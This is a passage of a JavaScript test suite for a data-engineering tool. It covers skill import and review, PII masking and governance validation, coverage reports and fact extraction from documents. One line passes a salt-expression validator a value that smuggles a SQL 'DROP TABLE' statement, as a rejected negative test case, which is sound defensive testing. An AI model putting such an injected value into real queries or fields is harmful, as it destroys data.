    const W = ['--workspace', ws];
    let client;
    try {
      const several = await cli(['skills', 'analyze', ex, ...W]);
      assert.strictEqual(several.code, 2, several.out + several.err);
      assert.match(several.out, /2 skills found; choose one with --skill:\n  table-freshness-check/);
      const an = await cli(['skills', 'analyze', ex, '--skill', 'team-sql-conventions', ...W, '--json']);
      assert.strictEqual(an.code, 0, an.out + an.err);
      assert.strictEqual(an.json().analysis.classification.value, 'knowledge');
      assert.ok(!nodeFs.existsSync(nodePath.join(ws, '.autode', 'config', 'skills', 'tool-skills')), 'analysing copies nothing');
      nodeFs.mkdirSync(nodePath.join(ws, '.vscode'), { recursive: true });
      nodeFs.writeFileSync(nodePath.join(ws, '.vscode', 'settings.json'), '{\n  // the team manages skill versions\n  "autoDataEngineeringHub.toolSkillManagementEnabled": true,\n}\n');
      const imp = await cli(['skills', 'import', ex, '--skill', 'table-freshness-check', ...W]);
      assert.strictEqual(imp.code, 0, imp.out + imp.err);
      assert.match(imp.out, /✓ Imported as table-freshness-check \(draft, unreviewed\)\. Next: `autode skills review table-freshness-check`/);
      assert.strictEqual((await cli(['skills', 'import', ex, '--skill', 'table-freshness-check', ...W])).code, 4, 'already imported: --replace');
      assert.strictEqual((await cli(['skills', 'publish', 'table-freshness-check', ...W])).code, 4, 'a person at a terminal');
      const early = await cli(['skills', 'publish', 'table-freshness-check', ...W], { interactive: true, answers: ['publish'] });
      assert.strictEqual(early.code, 4);
      assert.match(early.err, /Review it before publishing: it carries scripts/);
      assert.strictEqual((await cli(['skills', 'review', 'table-freshness-check', ...W], { interactive: true, answers: ['no'] })).code, 4);
      const rev = await cli(['skills', 'review', 'table-freshness-check', ...W], { interactive: true, answers: ['reviewed'] });
      assert.strictEqual(rev.code, 0, rev.out + rev.err);
      assert.match(rev.out, /Limit \(mcp-engine §3\.1\)/, 'the capability report is part of the review');
      const pub = await cli(['skills', 'publish', 'table-freshness-check', ...W], { interactive: true, answers: ['publish'] });
      assert.strictEqual(pub.code, 0, pub.out + pub.err);
      const listed = (await cli(['skills', 'list', '--group', 'workspace', ...W, '--json'])).json().skills;
      assert.deepStrictEqual(listed.map((e) => [e.name, e.kind, e.scope, e.licence?.name, e.status]), [['table-freshness-check', 'procedure', 'team', 'MIT License', 'published, reviewed']]);
      const up = await cli(['skills', 'update', 'table-freshness-check', ...W]);
      assert.strictEqual(up.code, 0, up.out + up.err);
      assert.match(up.out, /is up to date with its source/);

      // MCP: analyse only, a workspace folder or an https URL.
      nodeFs.cpSync(nodePath.join(ex, 'team-sql-conventions'), nodePath.join(ws, 'incoming', 'team-sql-conventions'), { recursive: true });
      client = await mcpSession(ws);
      const m = (await client.callTool({ name: 'autode_skills_analyze', arguments: { source: 'incoming' } })).structuredContent;
      assert.strictEqual(m.analysis.classification.value, 'knowledge');
      assert.strictEqual(m.provenance.location, 'incoming');
      assert.match(m.next, /A person imports it/);
      const outside = await client.callTool({ name: 'autode_skills_analyze', arguments: { source: '../elsewhere' } });
      assert.ok(outside.isError && /outside the workspace/.test(JSON.stringify(outside.content)));
      const ssh = await client.callTool({ name: 'autode_skills_analyze', arguments: { source: 'git@github.com:org/skills.git' } });
      assert.ok(ssh.isError && /https URL/.test(JSON.stringify(ssh.content)));
      assert.ok(!nodeFs.existsSync(nodePath.join(ws, '.autode', 'config', 'skills', 'tool-skills', 'team-sql-conventions')));

      // The wizard, driven by its messages.
      const { PortSkillSession } = require('../dist/core/portSkillSession.js');
      const posted = []; const confirms = []; const reviewed = []; let answer = true;
      const host = {
        user: () => 'arun', workspaceRoot: () => ws, resourcesRoot: nodePath.join(__dirname, '..'), managementEnabled: () => true,
        pickFolder: async () => nodePath.join(ws, 'incoming'), confirm: async (t) => { confirms.push(t); return answer; },
        complete: async () => 'Here it is: {"classification":"knowledge","why":"conventions to read","summary":"SQL rules.","toolMapping":[],"prerequisites":[]}',
        review: async (id) => { reviewed.push(id); require('../dist/engine/skills/lifecycle.js').setTrustTier(nodePath.join(ws, '.autode', 'config', 'skills', 'tool-skills', id), 'reviewed', 'arun'); },
        post: (model) => posted.push(model), log: () => undefined, onChange: () => undefined
      };
      const s = new PortSkillSession(host);
      const last = () => posted[posted.length - 1];
      await s.onMessage({ type: 'analyze', source: { kind: 'git', location: '' } });
      assert.match(last().note.text, /Enter the repository's URL/);
      await s.onMessage({ type: 'example' });
      assert.deepStrictEqual([last().step, last().skills.length, last().examples], ['choose', 2, true]);
      await s.onMessage({ type: 'choose', subpath: 'team-sql-conventions' });
      assert.strictEqual(last().step, 'report');
      assert.match(last().report, /\*\*Kind:\*\* knowledge/);
      await s.onMessage({ type: 'propose' });
      assert.strictEqual(last().analysis.proposal.status, 'proposed');
      await s.onMessage({ type: 'decide', decision: 'accept' });
      assert.deepStrictEqual([last().analysis.classification.by, last().analysis.proposal.status], ['model', 'accepted']);
      answer = false;
      await s.onMessage({ type: 'import' });
      assert.strictEqual(last().step, 'report', 'not confirmed: nothing imported');
      answer = true;
      await s.onMessage({ type: 'import' });
      assert.deepStrictEqual([last().step, last().imported.status, last().imported.tier, last().imported.canPublish], ['imported', 'draft', 'unreviewed', true]);
      await s.onMessage({ type: 'review' });
      assert.deepStrictEqual(reviewed, ['team-sql-conventions']);
      await s.onMessage({ type: 'publish' });
      assert.match(last().note.text, /Published team-sql-conventions as version 1/);
      assert.deepStrictEqual(confirms, ['Import team-sql-conventions?', 'Import team-sql-conventions?', 'Publish team-sql-conventions?']);
      assert.deepStrictEqual(require('../dist/engine/skills/port.js').knowledgeSkills(ws).map((k) => k.id), ['team-sql-conventions']);
      assert.strictEqual(require('../dist/engine/skills/port.js').readAnalysis(nodePath.join(ws, '.autode', 'config', 'skills', 'tool-skills', 'team-sql-conventions')).classification.by, 'model');
      await s.onMessage({ type: 'reset' });
      assert.strictEqual(last().step, 'source');
    } finally { if (client) await client.close(); nodeFs.rmSync(ws, { recursive: true, force: true }); }
  });

  await test('v0.47.0: governance as code — the mask primitive (hash with an optional salt, redact; NULL stays NULL; no guessing in ANSI), classifications as facts, candidates by name, masking after staging, and a Pipeline Spec that leaves sensitive data unmasked is invalid', () => {
    const R = require('../dist/engine/transforms/registry.js');
    const G = require('../dist/engine/governance/governance.js');
    const C = fresh('../dist/engine/agents/primitiveCandidates.js');
    const { validatePipelineSpec } = require('../dist/engine/pipelineSpec/validator.js');
    const target = { platform: 'snowflake', database: '', schema: '' };
    const mask = (params, dialect = 'snowflake') => R.compileTransformSpec({ kind: 'mask', params: { sourceObject: 's', targetObject: 't', passthrough: ['id'], ...params } }, target, dialect);
    assert.match(mask({ columns: [{ name: 'email', strategy: 'hash' }] }).content, /CASE WHEN email IS NULL THEN NULL ELSE SHA2\(CAST\(email AS VARCHAR\), 256\) END AS email/);
    assert.match(mask({ columns: [{ name: 'email', strategy: 'hash' }] }, 'spark_sql').content, /sha2\(CAST\(email AS STRING\), 256\)/);
    assert.match(mask({ columns: [{ name: 'email', strategy: 'hash' }], saltExpression: '$PII_SALT' }).content, /SHA2\(CONCAT\(CAST\(\$PII_SALT AS VARCHAR\), CAST\(email AS VARCHAR\)\), 256\)/);
    assert.match(mask({ columns: [{ name: 'pwd', strategy: 'redact', redactValue: 'X' }] }).content, /CASE WHEN pwd IS NULL THEN NULL ELSE 'X' END AS pwd/);
    assert.throws(() => mask({ columns: [{ name: 'email', strategy: 'hash' }] }, 'ansi'), /ANSI SQL has no hash function/);
    assert.throws(() => mask({ columns: [{ name: 'id', strategy: 'hash' }] }), /both passed through and masked: id/);
    for (const bad of ["'literal-secret'", 'x; DROP TABLE t', "f(a)"]) assert.ok(!R.validateTransformSpec({ kind: 'mask', params: { sourceObject: 's', targetObject: 't', passthrough: [], columns: [{ name: 'e', strategy: 'hash' }], saltExpression: bad } }).valid, bad);
    assert.ok(R.validateTransformSpec({ kind: 'mask', params: { sourceObject: 's', targetObject: 't', passthrough: [], columns: [{ name: 'e', strategy: 'hash' }], saltExpression: "secret('pii', 'salt')" } }).valid);
    assert.ok(!R.validateTransformSpec({ kind: 'mask', params: { sourceObject: 's', targetObject: 't', passthrough: [], columns: [{ name: 'e', strategy: 'tokenize' }] } }).valid, 'reversible strategies are out of scope');

    // Classifications are facts; the latest live one per column, confirmed before proposed.
    const fact = (id, subject, value, status = 'active') => ({ id, kind: 'business_rule', subject: [subject], predicate: 'classification', value, statement: id, status, trust: status === 'active' ? 'confirmed' : 'inferred', evidence: [], validFrom: '', createdBy: 'user:t', createdAt: '' });
    const facts = G.governanceFacts([fact('g1', 'obj:shop/prod/shop.customers.email', { classification: 'pii', strategy: 'hash' }), fact('g2', 'obj:shop/prod/shop.customers.ssn', { classification: 'sensitive-pii' }), fact('g3', 'obj:shop/prod/shop.customers.email', { classification: 'none' }, 'proposed'), fact('g4', 'obj:shop/prod/shop.customers.ssn', { classification: 'bogus' })]);
    assert.deepStrictEqual(facts.map((f) => [f.column, f.classification, f.assertionId]), [['email', 'pii', 'g1'], ['ssn', 'sensitive-pii', 'g2']]);
    const cands = G.governanceCandidates([{ fqn: 'shop.customers', columns: ['customer_id', 'email', 'ssn', 'phone_number', 'password_hash', 'updated_at'] }], facts);
    assert.deepStrictEqual(cands.map((c) => [c.column, c.suggested, c.strategy, !!c.fact]), [['email', 'pii', 'hash', true], ['ssn', 'sensitive-pii', 'hash', true], ['phone_number', 'pii', 'hash', false], ['password_hash', 'sensitive-pii', 'redact', false]]);
    // Sample rows: a classified column is masked though its name says nothing (SEC-5).
    const { gateQueryResult } = require('../dist/engine/platform/sampleData.js');
    const rows = { columns: ['cust_ref', 'amount'], rows: [{ cust_ref: 'A-991', amount: 3 }], rowCount: 1 };
    assert.deepStrictEqual(gateQueryResult(rows, { allowSampleData: true, metadata: false, connectionId: 'c' }).maskedColumns, []);
    assert.deepStrictEqual(gateQueryResult(rows, { allowSampleData: true, metadata: false, connectionId: 'c', classified: ['CUST_REF'] }).maskedColumns, ['cust_ref']);
    assert.ok(G.personalDataInPlay({ text: 'Customer lifetime value by e-mail domain' }) && G.personalDataInPlay({ text: 'Daily revenue', columns: ['email'] }) && !G.personalDataInPlay({ text: 'Daily revenue from the shop orders, by channel', columns: ['order_id'] }));

    // Candidates mask right after staging, under the staged names, and fill the governance block.
    const table = { fqn: 'shop.customers', name: 'customers', columns: new Map(Object.entries({ customer_id: 'INT', email: 'VARCHAR', ssn: 'VARCHAR', updated_at: 'TIMESTAMP' })) };
    const key = { ...fact('k1', 'shop.customers', ['customer_id']), kind: 'key', predicate: 'primary' };
    const r = C.primitiveCandidates({ source: 'shop.customers', target: 'dim_customer', columns: [{ source: 'customer_id', target: 'customer_id' }, { source: 'email', target: 'email_address' }, { source: 'ssn', target: 'ssn' }, { source: 'updated_at', target: 'updated_at' }], schemaIndex: { tables: [table], byName: new Map([['customers', [table]]]) }, nodes: [], assertions: [key, fact('g1', 'obj:shop/prod/shop.customers.email', { classification: 'pii', strategy: 'hash' }), fact('g2', 'obj:shop/prod/shop.customers.ssn', { classification: 'sensitive-pii' })] });
    assert.deepStrictEqual(r.entity.transforms.map((t) => [t.kind, t.valid]), [['rename_cast', true], ['mask', true], ['dedup', true], ['incremental_load', true]]);
    const m = r.entity.transforms[1];
    assert.deepStrictEqual([m.params.sourceObject, m.params.targetObject, m.params.passthrough, m.params.columns], ['stg_shop_customers', 'stg_shop_customers_masked', ['customer_id', 'updated_at'], [{ name: 'email_address', strategy: 'hash' }, { name: 'ssn', strategy: 'hash' }]]);
    assert.strictEqual(r.entity.transforms[2].params.sourceObject, 'stg_shop_customers_masked', 'nothing downstream reads unmasked data');
    assert.deepStrictEqual(r.entity.governance.columns, [{ column: 'email_address', classification: 'pii' }, { column: 'ssn', classification: 'sensitive-pii' }]);

    // The spec: structurally, a sensitive-pii column must be masked; against the ledger, a confirmed one must be declared.
    const entity = { name: r.entity.name, source: r.entity.source, target: r.entity.target, governance: r.entity.governance, transforms: r.entity.transforms.map((t) => ({ kind: t.kind, params: t.params })) };
    const spec = (entities) => ({ specVersion: 1, id: 'ps', version: 1, status: 'draft', derivedFromBpsId: 'b', derivedFromBpsVersion: 1, targetPlatform: 'snowflake', entities, createdAt: 'x', updatedAt: 'x' });
    assert.deepStrictEqual(validatePipelineSpec(spec([entity])).errors, []);
    const unmasked = { ...entity, transforms: entity.transforms.filter((t) => t.kind !== 'mask') };
    assert.match(validatePipelineSpec(spec([unmasked])).errors.join(' '), /column ssn is sensitive-pii but no mask step masks it/);
    assert.deepStrictEqual(G.governanceGaps(spec([entity]), facts), { errors: [], warnings: [] });
    const undeclared = { ...unmasked, governance: undefined };
    const gaps = G.governanceGaps(spec([undeclared]), facts);
    assert.match(gaps.errors.join(' '), /shop\.customers\.ssn is sensitive-pii \(fact g2\); add ssn/);
    assert.match(gaps.warnings.join(' '), /shop\.customers\.email is personal data and passes through unmasked; mask email_address/);
    assert.deepStrictEqual(validatePipelineSpec(spec([{ ...entity, governance: undefined, transforms: [entity.transforms[0]] }])).errors, [], 'a spec without governance still validates');
  });

  await test('v0.47.0: governance on every surface — the interview asks its governance part only when personal data is in play; autode governance show and classify (a person, confirmed); autode_governance_candidates over MCP; the build stage\'s Pipeline Spec can\'t be approved while a confirmed sensitive column it reads is undeclared', async () => {
    const os = require('node:os'); const nodeFs = require('node:fs'); const nodePath = require('node:path');
    const S = require('../dist/engine/interview/state.js');
    const { interviewSkills } = require('../dist/engine/skills/skillRegistry.js');
    const { loadSkillPack } = require('../dist/engine/agents/definitions.js');
    const parts = interviewSkills(loadSkillPack(wfRes()).skills);
    assert.strictEqual(parts.find((p) => p.id === 'governance').askWhen, 'personal-data');
    const ws = nodeFs.mkdtempSync(nodePath.join(os.tmpdir(), 'autode-gov-'));
    let client;
    try {
      const p1 = nodePath.join(ws, 'p1'), p2 = nodePath.join(ws, 'p2');
      nodeFs.mkdirSync(p1); nodeFs.mkdirSync(p2);
      assert.ok('governance' in S.startInterview(p1, 'Customer churn by e-mail domain, under GDPR', parts).coverage);
      const plain = S.startInterview(p2, 'Daily revenue from the shop orders, by channel', parts);
      assert.ok(!('governance' in plain.coverage));
      assert.ok(!S.summarizeInterview(plain, parts).parts.some((p) => p.skill === 'governance'), 'not listed when not asked');

      // The spec carries what the interview found.
      const D = require('../dist/engine/documents/problemDocuments.js');
      const bps = { id: 'b', version: 1, status: 'draft', problemStatement: 'p', objectives: ['o'], successCriteria: [], scope: { in: ['x'], out: [] }, constraints: [], assumptions: [], createdAt: 'x', updatedAt: 'x', governance: { personalData: 'sensitive', regulations: ['GDPR'] }, sourceCatalog: [{ name: 'crm', type: 'database', sensitivity: 'personal' }] };
      const back = D.parseBusinessProblemSpec(D.serializeBusinessProblemSpec(bps));
      assert.deepStrictEqual([back.governance, back.sourceCatalog[0].sensitivity], [{ personalData: 'sensitive', regulations: ['GDPR'] }, 'personal']);
      assert.strictEqual(D.parseBusinessProblemSpec(D.serializeBusinessProblemSpec({ ...bps, governance: undefined })).governance, undefined);

      // Over MCP: the estate, then the candidates.
      nodeFs.writeFileSync(nodePath.join(ws, 'crm.sql'), 'CREATE TABLE crm.customers (\n  customer_id INT NOT NULL,\n  email VARCHAR(200),\n  ssn VARCHAR(11),\n  updated_at TIMESTAMP\n);\n');
      client = await mcpSession(ws);
      const call = async (name, args) => (await client.callTool({ name, arguments: args })).structuredContent;
      await call('autode_ingest_file', { path: 'crm.sql', system: 'crm' });
      const c = await call('autode_governance_candidates', { tables: ['crm.customers'] });
      assert.deepStrictEqual(c.candidates.map((x) => [x.column, x.suggested, x.strategy]), [['email', 'pii', 'hash'], ['ssn', 'sensitive-pii', 'hash']]);
      await client.close(); client = undefined;

      // The CLI: a person classifies.
      const W = ['--workspace', ws];
      assert.strictEqual((await cli(['governance', 'classify', 'crm.customers.ssn', '--as', 'sensitive-pii', ...W])).code, 4, 'a person at a terminal');
      assert.strictEqual((await cli(['governance', 'classify', 'crm.customers.ssn', '--as', 'secret', ...W])).code, 2);
      const cl = await cli(['governance', 'classify', 'crm.customers.ssn', '--as', 'sensitive-pii', ...W], { interactive: true, answers: ['classify'] });
      assert.strictEqual(cl.code, 0, cl.out + cl.err);
      assert.match(cl.out, /crm\.customers\.ssn is sensitive-pii, masked by hash\. \(fact .+, confirmed\)/);
      const again = await cli(['governance', 'classify', 'crm.customers.ssn', '--as', 'sensitive-pii', '--strategy', 'redact', ...W], { interactive: true, answers: ['classify'] });
      assert.strictEqual(again.code, 0, again.out + again.err);
      const shown = (await cli(['governance', 'show', '--table', 'crm.customers', ...W, '--json'])).json().candidates;
      assert.deepStrictEqual(shown.map((x) => [x.column, x.fact ? `${x.fact.classification}/${x.fact.strategy}/${x.fact.status}` : 'none']), [['email', 'none'], ['ssn', 'sensitive-pii/redact/active']], 'the second classification replaced the first');

      // The approval check reads the ledger: a build spec reading crm.customers without declaring ssn is refused.
      const { documentApprovalProblems } = require('../dist/engine/workflows/documentApproval.js');
      const prob = nodePath.join(ws, '.autode', 'problems', 'gov');
      nodeFs.mkdirSync(prob, { recursive: true });
      const entity = { name: 'dim_customer', source: { object: 'crm.customers', type: 'table' }, target: { object: 'dim_customer', materialization: 'table' }, transforms: [{ kind: 'rename_cast', params: { sourceObject: 'crm.customers', targetObject: 'stg', objectKind: 'view', columns: [{ source: 'customer_id', target: 'customer_id' }, { source: 'ssn', target: 'ssn' }] } }] };
      const ps = { specVersion: 1, id: 'ps', version: 1, status: 'draft', derivedFromBpsId: 'b', derivedFromBpsVersion: 1, targetPlatform: 'snowflake', entities: [entity], createdAt: 'x', updatedAt: 'x' };
      D.writePipelineSpec(prob, ps);
      assert.match(documentApprovalProblems(prob, 'build').join(' '), /crm\.customers\.ssn is sensitive-pii \(fact .+\); add ssn to the entity's governance block and mask it/);
      D.writePipelineSpec(prob, { ...ps, entities: [{ ...entity, governance: { columns: [{ column: 'ssn', classification: 'sensitive-pii' }] }, transforms: [...entity.transforms, { kind: 'mask', params: { sourceObject: 'stg', targetObject: 'stg_masked', passthrough: ['customer_id'], columns: [{ name: 'ssn', strategy: 'redact' }] } }] }] });
      assert.deepStrictEqual(documentApprovalProblems(prob, 'build'), []);
    } finally { if (client) await client.close(); nodeFs.rmSync(ws, { recursive: true, force: true }); }
  });

  // ── v0.48.0: C4c — capture coverage, verification and exploration mode ──

  const c4c = {
    graph(strip = []) {
      const { parseFile } = require('../dist/engine/context/fileIngestion.js');
      const nodes = []; const edges = [];
      for (const [f, sys] of [['shop.ddl', 'shop'], ['crm.ddl', 'crm']]) {
        const r = parseFile(c4a.read(`sources/${f}`), f, { system: sys, environment: 'prod' });
        nodes.push(...r.nodes); edges.push(...r.edges);
      }
      // Tables named in `strip` lose their declared key, so their key has to come from the data.
      const tableOf = new Map(edges.filter((e) => e.type === 'contains').map((e) => [e.target, e.source]));
      return { nodes: nodes.map((n) => (n.type === 'column' && strip.includes(tableOf.get(n.id)) ? { ...n, isPrimaryKey: false } : n)), edges };
    },
    samples() {
      const { parseSampleCsv, createSampleProbeExecutor } = require('../dist/engine/context/probes.js');
      return createSampleProbeExecutor(new Map([
        ['obj:shop/prod/shop.customers', parseSampleCsv(c4a.read('sources/samples/shop_customers.csv'))],
        ['obj:crm/prod/crm.customers', parseSampleCsv(c4a.read('sources/samples/crm_customers.csv'))],
        ['obj:crm/prod/crm.loyalty_members', parseSampleCsv(c4a.read('sources/samples/loyalty_members.csv'))]
      ]));
    },
    spec: { id: 'bps-ref', problemStatement: c4a.read('problem.md').split('\n').slice(2, 10).join('\n') }
  };

  await test('v0.48.0: the completeness checklist — on the reference problem every table and metric in scope is listed with what is known and what is missing, and every missing item has an action', () => {
    const cov = require('../dist/engine/context/coverage.js');
    const graph = c4c.graph();
    const names = cov.specMetricNames(c4c.spec);
    assert.ok(names.includes('net revenue') && names.some((n) => /customer retention/.test(n)), names.join());
    const r = cov.captureCoverage({ graph, assertions: [], spec: c4c.spec });
    const fqns = r.tables.map((t) => t.fqn);
    for (const t of ['shop.orders', 'shop.payments', 'shop.refunds', 'shop.products', 'shop.customers', 'crm.customers']) assert.ok(fqns.includes(t), `${t} in scope: ${fqns.join()}`);
    const orders = r.tables.find((t) => t.fqn === 'shop.orders');
    assert.deepStrictEqual(orders.items.map((i) => i.item), ['key', 'grain', 'change_column', 'load_pattern', 'classification', 'relationships', 'description']);
    assert.strictEqual(orders.items[0].status, 'known', 'the declared key');
    assert.ok(r.metrics.length >= 2 && r.metrics.every((m) => m.items.every((i) => i.status === 'missing' && i.action)), 'metrics named, not defined');
    for (const t of r.tables) for (const i of t.items) assert.ok(i.status === 'known' || i.action, `${t.fqn} ${i.item} has an action`);
    assert.strictEqual(r.actions.length, [...r.tables, ...r.metrics].reduce((n, x) => n + x.items.filter((i) => i.status !== 'known').length, 0));
    const pii = r.tables.find((t) => t.fqn === 'shop.customers').items.find((i) => i.item === 'classification');
    assert.ok(pii.status === 'missing' && /email/.test(pii.detail) && pii.action.type === 'classify', JSON.stringify(pii));
    // A fact closes its item; a proposal shows as proposed, with "confirm".
    const grain = { id: 'G1', kind: 'grain', subject: ['obj:shop/prod/shop.orders'], predicate: 'grain', value: ['order_id'], status: 'proposed', trust: 'inferred', evidence: [{ type: 'file', ref: 'x' }], statement: 's', validFrom: '', createdBy: 'u', createdAt: '' };
    const metric = { ...grain, id: 'M1', kind: 'metric', subject: ['net revenue'], predicate: 'defined_as', value: { name: 'net revenue', expression: 'SUM(x)', grain: ['day'], filters: [] }, status: 'active', trust: 'confirmed' };
    const r2 = cov.captureCoverage({ graph, assertions: [grain, metric], spec: c4c.spec });
    assert.strictEqual(r2.tables.find((t) => t.fqn === 'shop.orders').items[1].status, 'proposed');
    assert.deepStrictEqual(r2.metrics.find((m) => m.metric === 'net revenue').items.map((i) => i.status), ['known', 'known', 'known']);
    assert.match(cov.renderCoverage(r2), /# Capture coverage: \d+ of \d+ known[\s\S]*## shop\.orders/);
  });

  await test('v0.48.0: the data before any model — candidate keys, grain and foreign keys from the reference data, verified by probes; a declared key the data breaks is reported; personal data by value shape', async () => {
    const dc = require('../dist/engine/context/dataCandidates.js');
    const graph = c4c.graph(['obj:shop/prod/shop.customers']);
    const ids = ['obj:shop/prod/shop.customers', 'obj:crm/prod/crm.customers', 'obj:crm/prod/crm.loyalty_members'];
    const findings = await dc.findCandidates({ graph, tableIds: ids, assertions: [], executor: c4c.samples() });
    const line = (k, fqn) => findings.filter((f) => f.kind === k && f.fqn === fqn);
    const key = line('key', 'shop.customers')[0];
    assert.ok(key && key.columns[0] === 'customer_id' && key.result.pass === true && key.result.source === 'sample', JSON.stringify(key));
    assert.strictEqual(line('grain', 'shop.customers')[0].columns[0], 'customer_id');
    assert.strictEqual(line('declared_key', 'crm.customers')[0].result.pass, false, 'cust_no is declared but C-20003 appears twice');
    assert.strictEqual(line('declared_key', 'crm.loyalty_members')[0].result.pass, false);
    const fk = findings.filter((f) => f.kind === 'relationship').map((f) => [`${f.fqn}.${f.columns[0]}`, `${f.to.fqn}.${f.to.columns[0]}`, f.result.pass]);
    assert.deepStrictEqual(fk.sort(), [['crm.customers.shop_customer_id', 'shop.customers.customer_id', true], ['crm.loyalty_members.cust_no', 'crm.customers.cust_no', false]].sort());
    assert.deepStrictEqual(findings.filter((f) => f.kind === 'change_column').map((f) => `${f.fqn}.${f.columns[0]}`).sort(), ['crm.customers.last_modified', 'shop.customers.updated_at']);
    const shapes = findings.filter((f) => f.kind === 'personal_data').map((f) => `${f.fqn}.${f.columns[0]}:${f.shape}`).sort();
    assert.deepStrictEqual(shapes, ['crm.customers.email:email', 'crm.customers.phone:phone', 'shop.customers.email:email', 'shop.customers.phone:phone']);
    // The shape probe is a fixed template that returns counts only, in every dialect with regular expressions.
    const pr = require('../dist/engine/context/probes.js');
    for (const d of ['snowflake', 'spark_sql', 'oracle']) assert.match(pr.renderProbeSql({ check: 'shape', table: { fqn: 'crm.customers' }, columns: ['phone'], shape: 'phone' }, d), /^SELECT COUNT\(\*\) AS row_count, SUM\(.*\) AS present_count, SUM\(.*\) AS match_count FROM crm\.customers$/);
    assert.throws(() => pr.renderProbeSql({ check: 'shape', table: { fqn: 't' }, columns: ['p'], shape: 'phone' }, 'ansi'), /regular expressions/);
    // Recorded: those that passed, proposed but already verified; nothing twice; personal data is a person's to classify.
    const env = await c4a.ledger();
    try {
      const rec = await dc.recordCandidates(env.ledger, findings);
      assert.deepStrictEqual(rec.map((a) => a.kind).sort(), ['data_fact', 'data_fact', 'grain', 'key', 'relationship']);
      assert.ok(rec.filter((a) => a.kind !== 'data_fact').every((a) => a.status === 'proposed' && a.trust === 'verified' && a.verification.result === 'pass'));
      assert.strictEqual((await dc.recordCandidates(env.ledger, findings)).length, 0);
    } finally { env.cleanup(); }
  });

  await test('v0.48.0: documents — a fact whose quote is not in its section is dropped; a section the model skipped is read again; tables and fixed phrases are read without a model; a second source corroborates; the model is recorded; double reading keeps only agreeing keys', async () => {
    const dx = require('../dist/engine/context/documentExtraction.js');
    const sections = dx.splitSections(c4a.read('documents/pack/brd.md'));
    const doc = { id: 'brd', path: 'docs/brd.md' };
    const raw = { facts: [
      { section: '2-definitions:L6-L8', kind: 'metric', subject: ['net revenue'], predicate: 'defined_as', value: { name: 'net revenue', definition: 'gross minus discounts and refunds' }, statement: 'Net revenue…', quote: 'net revenue is GROSS order line value   minus discounts' },
      { section: '2-definitions:L6-L8', kind: 'metric', subject: ['retention'], predicate: 'defined_as', value: { name: 'retention', definition: 'within 30 days' }, statement: 'Retained within 30 days.', quote: 'another order within 30 days' },
      { section: '3-data-rules:L10-L12', kind: 'business_rule', subject: ['orders'], predicate: 'requires', value: { text: 'Every order must have a customer' }, statement: 'Every order must have a customer.' }
    ], sections: [{ section: '1-purpose:L3-L4', facts: 0 }] };
    const out = dx.parseDocumentExtraction(raw, doc, sections, 'a'.repeat(64), () => undefined, { model: 'copilot:gpt-x' });
    assert.strictEqual(out.proposed.length, 1, 'quote compared without case or spacing');
    assert.strictEqual(out.unsupported, 2);
    assert.ok(out.dropped.some((d) => /quote is not in the section/.test(d)) && out.dropped.some((d) => /no quote/.test(d)));
    assert.strictEqual(out.proposed[0].model, 'copilot:gpt-x');
    assert.strictEqual(out.proposed[0].evidence[0].excerpt, 'net revenue is GROSS order line value   minus discounts');
    assert.deepStrictEqual(out.reread, ['retail-analytics-business-requirements-draft:L1-L1', '4-constraints:L14-L15'], 'accounted: reported, or a fact taken');
    // Double reading: a key only the first reading saw is dropped; the rest stays.
    const key = { kind: 'key', subject: ['t'], predicate: 'primary', value: ['a'], statement: 'k', evidence: [{ type: 'file', ref: 'x' }] };
    const agreed = dx.agreeingReadings({ proposed: [key, { ...key, kind: 'business_term', value: { term: 'x' } }], dropped: [] }, { proposed: [], dropped: [] });
    assert.deepStrictEqual([agreed.proposed.map((p) => p.kind), /did not agree/.test(agreed.dropped[0])], [['business_term'], true]);
    // Deterministic first: a data dictionary and fixed phrases.
    const dict = ['# Customer dictionary', '', '## shop.customers', '', '| Column | Description | PK | Nullable |', '|---|---|---|---|', '| customer_id | Customer number | Y | N |', '| email | E-mail address |  | Y |', '| nonexistent | Ghost |  |  |', '', 'email must be unique. shop.orders.status is never null. shop.order_items has one row per order_item_id.'].join('\n');
    const resolve = require('../dist/engine/context/projection.js').createSubjectResolver(c4c.graph());
    const parsed = dx.parseDocumentDeterministic({ id: 'dict', path: 'docs/dict.md' }, dx.splitSections(dict), 'b'.repeat(64), resolve);
    const shapes = parsed.map((a) => `${a.kind}:${a.predicate}:${JSON.stringify(a.value.check ?? a.value)}:${a.subject[0].replace(/^obj:[a-z]+\/prod\//, '')}`).sort();
    assert.deepStrictEqual(shapes, [
      'business_term:defined_as:{"term":"customer_id","definition":"Customer number","boundTo":["obj:shop/prod/shop.customers.customer_id"]}:shop.customers.customer_id',
      'business_term:defined_as:{"term":"email","definition":"E-mail address","boundTo":["obj:shop/prod/shop.customers.email"]}:shop.customers.email',
      'grain:grain:["order_item_id"]:shop.order_items',
      'key:primary:["customer_id"]:shop.customers',
      'quality_expectation:expects:"not_null":shop.customers.customer_id',
      'quality_expectation:expects:"not_null":shop.orders.status',
      'quality_expectation:expects:"unique":shop.customers.email'
    ].sort(), JSON.stringify(shapes));
    assert.ok(parsed.every((a) => a.trust === 'documented' && a.status === 'proposed' && a.createdBy === 'parser:dict' && !a.model));
    // Agreement: the same fact from another document corroborates; from the same one, it is a duplicate.
    const env = await c4a.ledger();
    try {
      const first = await dx.recordWithAgreement(env.ledger, parsed);
      assert.deepStrictEqual(first, { recorded: parsed.length, corroborated: 0 });
      const again = parsed.map((a) => ({ ...a, createdBy: 'parser:contract', evidence: [{ type: 'file', ref: 'docs/contract.md#s:L1-L2@cccccccccccc' }] }));
      assert.deepStrictEqual(await dx.recordWithAgreement(env.ledger, again.slice(0, 1)), { recorded: 0, corroborated: 1 });
      assert.deepStrictEqual(await dx.recordWithAgreement(env.ledger, parsed.slice(0, 1)), { recorded: 0, corroborated: 0 });
      const held = env.ledger.assertions().find((a) => a.statement === parsed[0].statement);
      assert.deepStrictEqual([held.evidence.length, held.corroboratedBy], [2, ['parser:contract']]);
    } finally { env.cleanup(); }
  });

  await test('v0.48.0: the conversation, reviewed — messages that read like facts and have no fact citing them are listed (not questions, not commands); dismissed ones are not listed again', () => {
    const os = require('node:os'); const nodeFs = require('node:fs'); const nodePath = require('node:path');
    const sr = require('../dist/engine/context/sessionReview.js');
    const turns = [
      { ref: 'chat:c#0', text: 'order_id is unique across all channels' },
      { ref: 'chat:c#2', text: 'Which tables hold refunds?' },
      { ref: 'chat:c#4', text: '/rule refunds count on the refund day' },
      { ref: 'chat:c#6', text: 'A customer is retained if they order again within 90 days' },
      { ref: 'chat:c#8', text: 'thanks, looks good' }
    ];
